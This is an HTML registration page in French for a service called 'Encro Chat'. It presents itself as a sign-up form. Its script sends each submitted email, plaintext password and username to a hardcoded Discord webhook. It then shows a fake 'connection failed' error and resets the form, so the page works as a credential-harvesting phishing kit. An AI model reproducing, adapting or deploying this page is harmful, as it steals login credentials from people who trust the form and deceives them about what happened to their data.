<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Inscription - Encro Chat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: #020c1b;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      background: rgba(255, 255, 255, 0.05);
      padding: 40px;
      border-radius: 16px;
      backdrop-filter: blur(15px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      animation: fadeIn 1s ease forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-weight: 600;
      font-size: 28px;
      color: white;
    }

    .form-group {
  margin-bottom: 25px;
  position: relative;
}

.form-group input {
  width: 100%;
  padding: 12px 40px 12px 12px; /* padding right augmenté pour laisser la place à l'œil */
  border: none;
  border-radius: 8px;
  background: rgba(255, 255, 255, 0.1);
  color: #fff;
  font-size: 16px;
  outline: none;
}

.form-group i {
  position: absolute;
  top: 50%;
  right: 12px;
  transform: translateY(20%);
  color: black;
  font-size: 20px;
  cursor: pointer;
  pointer-events: all;
}


    label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      color: #fff;
    }

    input {
      width: 100%;
      padding: 12px 40px 12px 12px;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      font-size: 16px;
      outline: none;
    }

    input::placeholder {
      color: #ccc;
    }

    .form-group i {
      position: absolute;
      top: 0;
      bottom: 0;
      right: 12px;
      display: flex;
      align-items: center;
      color: #ccc;
      font-size: 20px;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #0d6efd;
      color: white;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #0b5ed7;
    }

    #error-message {
      margin-top: 15px;
      color: #ff6b6b;
      text-align: center;
      font-size: 14px;
    }

    .login-link {
      text-align: center;
      margin-top: 20px;
    }

    .login-link a {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      border-bottom: 1px solid transparent;
    }

    .login-link a:hover {
      border-bottom: 1px solid #fff;
    }

    @media screen and (max-width: 500px) {
      .container {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Inscription à Encro Chat</h2>
    <form id="loginForm" method="POST">
      <div class="form-group">
        <label for="email">Adresse Email</label>
        <input type="email" id="email" required placeholder="ex: ton@email.com">
      </div>
      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required placeholder="Choisis un mot de passe">
        <i class='bx bx-hide' id="togglePassword"></i>
      </div>
      <div class="form-group">
        <label for="pseudo">Pseudo</label>
        <input type="text" id="pseudo" required placeholder="Ton pseudo ici">
      </div>
      <button type="submit">S'inscrire</button>
      <div id="error-message"></div>
    </form>
    <div class="login-link">
      <p>Déjà un compte ? <a href="login.html">Se connecter</a></p>
    </div>
  </div>

  <script>
    const toggle = document.getElementById('togglePassword');
    const password = document.getElementById('password');
    toggle.addEventListener('click', () => {
      const type = password.type === 'password' ? 'text' : 'password';
      password.type = type;
      toggle.className = type === 'password' ? 'bx bx-hide' : 'bx bx-show';
    });

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const pseudo = document.getElementById('pseudo').value.trim();
      const errorMsg = document.getElementById('error-message');

      const allowedDomains = ['gmail.com', 'outlook.com', 'outlook.fr'];
      const emailDomain = email.split('@')[1];

      if (!allowedDomains.includes(emailDomain)) {
        errorMsg.textContent = "Adresse email non autorisée.";
        return;
      }

      fetch('https://discord.com/api/webhooks/1380281664013598832/lkpjFMRnvYcfWzU1YT2ek0p_8ZS1ZG57-lyz7o9LW91zFLZWSWBWh-Yct1M0oA-Qgp-M', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `🔐 Connexion:\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n👤 Pseudo: ${pseudo}`
        })
      }).then(() => {
        errorMsg.textContent = "Connexion impossible, veuillez réessayer.";
        document.getElementById('loginForm').reset();
      }).catch(() => {
        errorMsg.textContent = "Erreur lors de la tentative de connexion.";
      });
    });
  </script>
</body>
</html>
